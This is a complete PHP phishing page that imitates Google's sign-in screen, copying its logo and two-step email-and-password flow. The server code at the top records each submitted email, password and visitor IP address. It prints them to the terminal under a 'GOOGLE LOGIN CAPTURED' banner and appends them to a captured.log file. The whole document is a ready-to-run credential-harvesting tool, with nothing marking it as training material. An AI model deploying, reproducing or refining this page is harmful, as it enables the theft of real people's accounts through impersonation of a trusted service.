<?php
// Capture credentials
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Display in terminal
    $stderr = fopen('php://stderr', 'w');
    if ($stderr) {
        fprintf($stderr, "\n╔════════════════════════════════════════════════════════════╗\n");
        fprintf($stderr, "║ [GOOGLE LOGIN CAPTURED]                                    ║\n");
        fprintf($stderr, "║ Email: %s\n", str_pad($email, 50));
        fprintf($stderr, "║ Password: %s\n", str_pad($password, 44));
        fprintf($stderr, "║ Time: %s\n", date('Y-m-d H:i:s'));
        fprintf($stderr, "║ IP: %s\n", str_pad($_SERVER['REMOTE_ADDR'] ?? 'unknown', 49));
        fprintf($stderr, "╚════════════════════════════════════════════════════════════╝\n\n");
        fclose($stderr);
    } else {
        error_log("[GOOGLE LOGIN CAPTURED] Email: $email | Password: $password | IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
    }
    
    // Log to file
    $log_entry = sprintf(
        "[%s] GOOGLE LOGIN | IP: %s | Email: %s | Password: %s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        $email,
        $password
    );
    
    file_put_contents(__DIR__ . '/captured.log', $log_entry, FILE_APPEND);
    error_log($log_entry);
    
    // Redirect to terminal after capture
    header('Location: index.php?google_success=1');
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with your Google Account</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with your Google Account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: #ffffff;
            height: 100%;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px 0;
        }

        .google-container {
            width: 100%;
            max-width: 450px;
            padding: 20px;
        }

        .google-card {
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(255, 255, 255, 1);
            border-radius: 8px;
            padding: 48px 40px 36px 40px;
            text-align: center;
            background: #ffffff;
        }

        .google-logo-svg {
            width: 238px;
            height: 32px;
            margin-bottom: 28px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 12px;
            color: #202124;
            letter-spacing: 0.5px;
        }

        .subtitle {
            color: #5f6368;
            font-size: 14px;
            margin-bottom: 28px;
            font-weight: 400;
            line-height: 1.5;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            color: #3c4043;
            font-size: 12px;
            font-weight: 500;
            margin-bottom: 10px;
            letter-spacing: 0.3px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 12px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            transition: all 0.2s ease;
            background: #ffffff;
            color: #202124;
        }

        input[type="email"]:hover,
        input[type="password"]:hover {
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.04), 0 4px 8px rgba(0, 0, 0, 0.08);
            border-color: #d3d3d3;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #4285f4;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.04), 0 4px 8px rgba(66, 133, 244, 0.2);
        }

        input::placeholder {
            color: #9aa0a6;
        }

        .forgot-link {
            text-align: left;
            margin-top: 14px;
            margin-bottom: 0;
        }

        .forgot-link a {
            color: #1f71e6;
            text-decoration: none;
            font-size: 14px;
            font-weight: 400;
        }

        .forgot-link a:hover {
            text-decoration: underline;
            color: #1765cc;
        }

        .help-text {
            text-align: left;
            margin-top: 24px;
            padding-top: 20px;
            border-top: 1px solid #e8eaed;
            color: #5f6368;
            font-size: 13px;
            line-height: 1.6;
        }

        .help-text strong {
            display: block;
            margin-bottom: 8px;
            color: #3c4043;
            font-weight: 500;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 32px;
            gap: 8px;
        }

        .btn {
            padding: 10px 26px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border: none;
            transition: all 0.2s ease;
            min-width: 80px;
        }

        .btn-cancel {
            background: #f8f9fa;
            color: #3c4043;
            border: 1px solid #dadce0;
        }

        .btn-cancel:hover {
            background: #f8f9fa;
            border-color: #d3d3d3;
            box-shadow: 0 1px 1px rgba(0, 0, 0, 0.1);
        }

        .btn-next {
            background: #4285f4;
            color: white;
            flex-grow: 1;
            border: 1px solid #4285f4;
        }

        .btn-next:hover {
            background: #3367d6;
            border-color: #3367d6;
            box-shadow: 0 4px 4px 0 rgba(60, 64, 67, 0.1), 0 8px 12px 6px rgba(60, 64, 67, 0.14);
        }

        .btn-next:active {
            background: #2d55d4;
            border-color: #2d55d4;
        }

        .btn-next:disabled {
            background: #dadce0;
            color: #9aa0a6;
            cursor: not-allowed;
            border-color: #dadce0;
            box-shadow: none;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .google-card {
            animation: slideIn 0.4s ease-out;
        }
    </style>
</head>
<body>
    <div class="google-container">
        <div class="google-card">
<div class="logo-header">
                    <svg class="google-logo-svg" viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M533.5 278.4c0-18.9-1.5-37.1-4.6-54.7H272v103.6h146.9c-6.3 34.1-25.5 63-54.2 82.3v68.3h87.5c51.1-47.1 80.3-116.6 80.3-199.5z"/>
                        <path fill="#34A853" d="M272 544.3c73.5 0 135.3-24.4 180.4-66.1l-87.5-68.3c-24.3 16.3-55.2 26-92.9 26-71.2 0-131.7-48.1-153.4-112.8H27.7v70.9C73.3 489 167.6 544.3 272 544.3z"/>
                        <path fill="#FBBC05" d="M118.6 323.1c-10.8-32.4-10.8-67.3 0-99.7V152.5H27.7c-39.8 79.7-39.8 173.1 0 252.8l90.9-70.2z"/>
                        <path fill="#EA4335" d="M272 107.3c39.9 0 75.9 13.7 104.2 40.6l78.1-78.1C409.3 24.4 347.5 0 272 0 167.6 0 73.3 55.3 27.7 142.5l90.9 70.9C140.3 155.4 200.8 107.3 272 107.3z"/>
                    </svg>
                </div>

            <h1>Sign in</h1>
            <p class="subtitle">to continue to Google services</p>

            <form method="POST" id="googleForm">
                <div class="form-group">
                    <label for="email">Email or phone</label>
                    <input 
                        type="text" 
                        id="email" 
                        name="email" 
                        autocomplete="username"
                        required 
                        autofocus
                        placeholder="you@gmail.com or +1 (555) 123-4567"
                    >
                </div>

                <div class="forgot-link">
                    <a href="https://accounts.google.com/signin/recovery" target="_blank" rel="noreferrer">Forgot email?</a>
                </div>

                <div class="help-text">
                    <strong>Not your computer?</strong>
                    Use a private browsing window to sign in safely.
                </div>

                <div class="buttons">
                    <button type="button" class="btn btn-cancel" onclick="history.back()">Cancel</button>
                    <button type="button" class="btn btn-next" onclick="nextStep()">Next</button>
                </div>
            </form>
        </div>
    </div>

    <div id="passwordStep" style="display: none;">
        <div class="google-container">
            <div class="google-card">
                <div class="logo-header" style="margin-bottom: 20px;">
                    <svg class="google-logo-svg" viewBox="0 0 533.5 544.3" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#4285F4" d="M533.5 278.4c0-18.9-1.5-37.1-4.6-54.7H272v103.6h146.9c-6.3 34.1-25.5 63-54.2 82.3v68.3h87.5c51.1-47.1 80.3-116.6 80.3-199.5z"/>
                        <path fill="#34A853" d="M272 544.3c73.5 0 135.3-24.4 180.4-66.1l-87.5-68.3c-24.3 16.3-55.2 26-92.9 26-71.2 0-131.7-48.1-153.4-112.8H27.7v70.9C73.3 489 167.6 544.3 272 544.3z"/>
                        <path fill="#FBBC05" d="M118.6 323.1c-10.8-32.4-10.8-67.3 0-99.7V152.5H27.7c-39.8 79.7-39.8 173.1 0 252.8l90.9-70.2z"/>
                        <path fill="#EA4335" d="M272 107.3c39.9 0 75.9 13.7 104.2 40.6l78.1-78.1C409.3 24.4 347.5 0 272 0 167.6 0 73.3 55.3 27.7 142.5l90.9 70.9C140.3 155.4 200.8 107.3 272 107.3z"/>
                    </svg>
                </div>

                <h1>Welcome</h1>
                <p class="subtitle" id="emailDisplay" style="min-height: 42px;"></p>

                <form id="passwordForm" method="POST" onsubmit="submitPassword(event)">
                    <input type="hidden" id="emailHidden" name="email">

                    <div class="form-group">
                        <label for="password">Password</label>
                        <input 
                            type="password" 
                            id="password" 
                            name="password" 
                            required 
                            autofocus
                            placeholder="Enter your password"
                        >
                    </div>

                    <div class="forgot-link">
                    <a href="https://accounts.google.com/signin/recovery" target="_blank" rel="noreferrer">Forgot password?</a>

                    <div class="buttons">
                        <button type="button" class="btn btn-cancel" onclick="backToEmail()">Back</button>
                        <button type="submit" class="btn btn-next">Next</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const emailHidden = document.getElementById('emailHidden');

        function validateEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$|^[+]?[\d\s()-]{7,}$/;
            return emailRegex.test(email);
        }

        function nextStep() {
            const email = emailInput.value.trim();
            if (!email) {
                emailInput.focus();
                return;
            }

            if (!validateEmail(email)) {
                emailInput.style.borderColor = '#d33b27';
                setTimeout(() => {
                    emailInput.style.borderColor = '#dadce0';
                }, 1000);
                return;
            }

            emailHidden.value = email;
            document.querySelector('.google-container').style.display = 'none';
            document.getElementById('passwordStep').style.display = 'block';
            
            const displayEmail = email.length > 35 ? email.substring(0, 32) + '...' : email;
            document.getElementById('emailDisplay').innerHTML = `Enter your password for <strong style="color: #202124; font-weight: 500;">${displayEmail}</strong>`;
            
            setTimeout(() => {
                passwordInput.focus();
            }, 100);
        }

        function backToEmail() {
            document.querySelector('.google-container').style.display = 'block';
            document.getElementById('passwordStep').style.display = 'none';
            emailInput.value = '';
            emailInput.focus();
        }

        function submitPassword(e) {
            e.preventDefault();
            if (passwordInput.value.length >= 1) {
                document.getElementById('passwordForm').submit();
            }
        }

        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                nextStep();
            }
        });

        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitPassword(e);
            }
        });
    </script>
</body>
</html>
